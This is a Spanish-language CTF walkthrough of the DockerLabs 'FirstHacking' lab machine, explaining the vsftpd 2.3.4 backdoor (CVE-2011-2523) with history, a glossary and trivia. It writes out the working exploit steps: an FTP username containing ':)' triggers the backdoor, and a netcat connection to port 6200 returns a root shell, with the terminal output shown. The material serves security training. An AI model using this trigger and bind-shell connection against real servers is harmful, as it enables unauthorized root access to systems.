// 01

Contexto

FirstHacking es la máquina de iniciación de DockerLabs, pensada como primer contacto con un pentest real de principio a fin: desplegar el objetivo, escanear, identificar un servicio vulnerable y explotarlo hasta obtener acceso de root. Lo que se aprende aquí no es una técnica compleja, sino el flujo de trabajo completo que se repetirá en máquinas mucho más difíciles.

// NOTA

Etapa histórica — CVE-2011-2523: el 30 de junio de 2011, el código fuente oficial de vsftpd 2.3.4 alojado en el servidor de descargas del proyecto fue comprometido y sustituido por una versión troyanizada. Cualquiera que descargara el tarball entre esa fecha y el 3 de julio de 2011 (cuando se detectó y retiró) obtenía un backdoor oculto en el binario. Quince años después, esa versión sigue usándose deliberadamente en laboratorios y CTFs como ejercicio clásico de explotación de servicios.

Un único puerto abierto, el 21 (FTP), corriendo exactamente la versión vsftpd 2.3.4. Ese número de versión es la señal de alarma: coincide con el tarball troyanizado de 2011.

// 03

Explotación

El backdoor de vsftpd 2.3.4 se activa de una forma muy particular: si el nombre de usuario que se envía al servidor FTP contiene la secuencia de caracteres :) (un emoticono), el código malicioso insertado en el binario abre, en segundo plano, un listener en el puerto 6200 que entrega una shell de sistema sin pedir ninguna autenticación adicional.

3
ACTIVACIÓN DEL BACKDOOR VÍA FTP
BASH
$ ftp 172.17.0.2
Connected to 172.17.0.2.
220 (vsFTPd 2.3.4)
Name (172.17.0.2:kali): AbogadoCibernetico:)
331 Please specify the password.
Password:

// NOTA

No importa si la contraseña es correcta o si la conexión FTP se cae después: el solo hecho de enviar un usuario con :) ya disparó el backdoor en el puerto 6200 del lado del servidor.

// 04

Acceso y escalada

BASH
$ nc 172.17.0.2 6200
(UNKNOWN) [172.17.0.2] 6200 (?) : Connection refused

// NOTA

El primer intento puede fallar si el backdoor todavía no terminó de inicializarse tras el paso anterior. Basta con reintentar.

BASH
$ nc 172.17.0.2 6200
BASH
$ whoami
root
BASH
$ cd /root
$ ls -la
total 20
drwx------ 1 root root 4096 May 5 2024 .
drwxr-xr-x 1 root root 4096 Oct 3 23:27 ..
-rw-r--r-- 1 root root 3106 Dec 5 2019 .bashrc
-rw-r--r-- 1 root root 161 Dec 5 2019 .profile
drwxr-xr-x 1 root root 4096 May 5 2024 vsftpd-2.3.4

No hace falta ninguna escalada de privilegios adicional: el backdoor entrega una shell directamente como root, lo que convierte a esta máquina en un ejemplo perfecto de por qué una sola versión desactualizada puede comprometer un sistema completo sin pasos intermedios.

// 06

Glosario

  • FTP (File Transfer Protocol): protocolo de transferencia de archivos que, en su forma clásica, viaja sin cifrar por el puerto 21.
  • vsFTPd: "Very Secure FTP Daemon", servidor FTP para sistemas Unix/Linux diseñado originalmente con la seguridad como prioridad; irónicamente, la versión 2.3.4 es la más famosa por un backdoor.
  • Backdoor: puerta trasera; código oculto insertado deliberadamente en un programa para otorgar acceso no autorizado, saltándose los controles normales de autenticación.
  • CVE (Common Vulnerabilities and Exposures): identificador público y estandarizado que cataloga una vulnerabilidad de seguridad conocida.
  • Netcat (nc): herramienta de red que crea conexiones TCP/UDP arbitrarias; se la conoce como la "navaja suiza" del networking y es habitual para recibir shells remotas.
  • Shell: intérprete de comandos del sistema operativo; obtener una "shell como root" significa tener control total sobre la máquina.
  • Root: el usuario con privilegios máximos en un sistema Unix/Linux, equivalente al administrador en Windows.
  • Puerto: número que identifica un servicio específico dentro de una dirección IP; en este caso, el 21 (FTP legítimo) y el 6200 (backdoor).

// 07

Curiosidades

  • El backdoor de vsftpd 2.3.4 estuvo disponible para descarga pública durante apenas unos días en 2011, pero como el código fuente comprometido quedó replicado en mirrors y repositorios, la versión troyanizada siguió circulando mucho después del incidente original.
  • El gatillo del backdoor es deliberadamente absurdo: basta con que el nombre de usuario contenga el emoticono :) para que el servidor abra una shell root en el puerto 6200, sin validar nada más.
  • A pesar de ser una vulnerabilidad de 2011, vsftpd 2.3.4 sigue siendo una de las máquinas de entrenamiento más usadas en plataformas como DockerLabs, HackTheBox (Metasploitable2) y TryHackMe, precisamente porque ilustra de forma muy clara el riesgo de ejecutar software desactualizado o de fuentes no verificadas.

// 08

Resumen

nmap descubre vsftpd 2.3.4 en el puerto 21 → se identifica como la versión troyanizada (CVE-2011-2523) → se envía un usuario FTP con :) para activar el backdoor → se conecta con netcat al puerto 6200 → se obtiene una shell directa como root, sin necesidad de escalada de privilegios.
